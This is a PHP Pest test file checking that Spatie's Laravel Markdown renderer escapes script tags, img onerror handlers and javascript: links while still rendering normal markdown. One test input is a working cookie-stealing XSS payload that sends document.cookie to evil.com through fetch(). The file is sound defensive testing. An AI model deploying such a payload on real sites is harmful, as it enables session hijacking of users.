<?php

use Spatie\LaravelMarkdown\MarkdownRenderer;

it('escapes script tags in markdown output', function () {
    $renderer = app(MarkdownRenderer::class);

    $html = $renderer->toHtml('<script>alert("xss")</script>');

    expect($html)->not->toContain('<script>');
    expect($html)->toContain('&lt;script&gt;');
});

it('escapes img onerror XSS payloads in markdown output', function () {
    $renderer = app(MarkdownRenderer::class);

    $html = $renderer->toHtml('<img src=x onerror="fetch(\'https://evil.com/\'+document.cookie)">');

    expect($html)->not->toContain('<img ');
    expect($html)->toContain('&lt;img');
});

it('blocks javascript: protocol links in markdown output', function () {
    $renderer = app(MarkdownRenderer::class);

    $html = $renderer->toHtml('[click me](javascript:alert("xss"))');

    expect($html)->not->toContain('javascript:');
});

it('still renders valid markdown formatting', function () {
    $renderer = app(MarkdownRenderer::class);

    $html = $renderer->toHtml("**Bold text** and [a link](https://example.com)\n\n- Item 1\n- Item 2");

    expect($html)->toContain('<strong>Bold text</strong>');
    expect($html)->toContain('<a href="https://example.com">a link</a>');
    expect($html)->toContain('<li>Item 1</li>');
    expect($html)->toContain('<li>Item 2</li>');
});
